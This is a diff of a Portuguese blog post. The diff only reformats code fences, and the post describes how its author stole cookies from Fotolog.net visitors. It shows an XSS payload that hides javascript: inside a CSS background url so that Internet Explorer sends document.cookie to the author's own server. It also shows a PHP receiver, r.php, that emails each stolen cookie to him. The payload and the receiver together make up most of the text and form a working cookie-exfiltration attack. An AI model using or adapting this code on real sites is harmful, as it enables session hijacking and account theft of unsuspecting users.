@@ -48,14 +48,14 @@ _OBS.: Tenho recebido e-mail de pessoas dizendo que o não cabe… O meu também
 
 Este código só funciona porque o _Internet Explorer_ é problemático! Não tem nada a ver um _JavaScript_ dentro de uma url de fundo e ainda ir para este endereço! E o [Fotolog.net][2] também tem um bug seríssimo porque não deveria poder se usar aspas no endereço de um site! Daí no meu profile aparece no lugar do endereço da minha página:
 
-```
+```html
 <a href="#" style="background:url(ja       vas       cript:location.href=%27 http://www.tiagomadeira.net/r.php?c=%27       +escape(document.cookie))">#" style="background:url(ja       vas       cript:location.href=%27 http://www.tiagomadeira.net/r.php?c=%27       +escape(document.cookie))</a>
 ```
 
 Bom, depois disso basta fazer uma página PHP que passe este valor do c para um banco de dados ou e-mail (no meu caso, preferi por e-mail mesmo). Criei uma página no meu /r.php com:
 
 ```php
-< ?php
+<?php
 $cookie=$_GET["c"];
 mail("meu@email", "Presente pra você!", "$cookie");
 Header("Location: http://tableless.tiagomadeira.net");
